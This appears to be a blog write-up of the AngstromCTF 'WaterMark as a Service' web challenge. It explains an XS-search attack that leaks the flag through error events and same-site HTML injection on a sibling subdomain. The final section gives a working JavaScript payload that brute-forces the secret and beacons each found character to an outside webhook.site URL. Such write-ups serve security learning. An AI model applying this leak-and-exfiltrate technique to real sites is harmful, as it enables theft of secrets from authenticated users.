+++
title = 'WaterMark as a Service AngstromCTF'
date = 2024-05-26T21:01:42+05:30
draft = false
tags = ["writeups"] 
+++

**tl;dr**

+ XS-search 200 / 404 .
+ Leaking using HTML injection in a same-site challenge.
+ Link tags and Error events .

<!--more-->
## 🔎 Initial analysis 

We are given the application source code and a challenge link. Also, there is a ``waaas.js`` for the admin bot. Looking at the application, the main functionality was the search endpoint.

Taking a look at the code for /search endpoint in the ``index.js`` file.

```js 
app.get('/search', (req, res) => {
	if (req.cookies['admin_cookie'] !== secretvalue) {
		res.status(403).send("Unauthorized");
		return;
	}
	try {
		let query = req.query.q;
		for (let flag of flags) {
			if (flag.indexOf(query) !== -1) {
				res.status(200).send("Found");
				return;
			}
		}
		res.status(404).send("Not Found");
	} catch (e) {
		console.log(e);
		res.sendStatus(500);
	}
})
```
It was basically checking if our input query was a substring of the flag. But we cannot send requests to /search due to the check in the start, which checks whether or not the request is from the admin user. So our requests would get 403 Unauthorized as the response.
## 🥷 Attack plan

Since we cant directly access the /search enpoint we have to somehow make the admin send those requests. One approach is to get XSS anywhere in the site so we can send fetch requests bruteforce the flag. But unfortunately there is no XSS in this site.

The Next approach would be an **XS-Search** attack to leak the flag . As the bot is visiting any url we give it. In the /search enpoint if the query is a valid substring of the flag it was returning **200 Found** and if its not a valid substring it was returning **404 Not Found**.

We can use [Error Events](https://https://xsleaks.dev/docs/attacks/error-events/) to differntiate between these 2 status codes cross site .

But there is another issue . . . . . **Same Site Cookies!!** . Looking the admin bots source code we can see that the admin cookie is **same-site Lax** . 

```js 
const cookie = {
                domain: domain,
                name: "admin_cookie",
                value: key,
                httpOnly: true,
                secure: true,
                sameSite: 'Lax'
    };
```
So the cookies won't be sent on the  requests which are sent from our hosted exploit as it wont be same-site 😓.

## SameSite Leaks ftw  🌟

If we have XSS or HTML injection in any domain which is same-site to the challenge domain we can use that in our favour for [Same Site Leaks](https://https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks).

The challenge was hosted on ``https://wwwwwwwwaas.web.actf.co/`` and all other challenges was were subdomains of ``web.actf.co`` and fortunately we had XSS on ``markdown.web.actf.co`` which is **same-site**.

So now we can host our exploit to leak the flag on ``markdown.web.actf.co`` .

## 🚀 Final Payloads

```js
const charset = "abcdef1234567890{}ghijklmnopqrstuvwxyz_"
let found = "actf"
const leak_url = "https://webhook.site/4d3c543c-1211-4c4c-9fea-c7fc3336e2a5"   

const next = (i) => {
      char = charset[i]
      link = document.createElement("link")
      link.rel = "stylesheet"
      document.head.appendChild(link)            
      link.onload = () => {
           found += charset[i]
           navigator.sendBeacon(leak_url,JSON.stringify({type: "success", found:found,char:charset[i] }))
           next(0)
       }

       link.onerror = () => {
           next(i+1)
       }
       link.href = "https://wwwwwwwwaas.web.actf.co/search?q="+found+charset[i]
}
next(0)
```
## 🚩 Flag 

``actf{the_w_watermarks_the_whereabouts}``
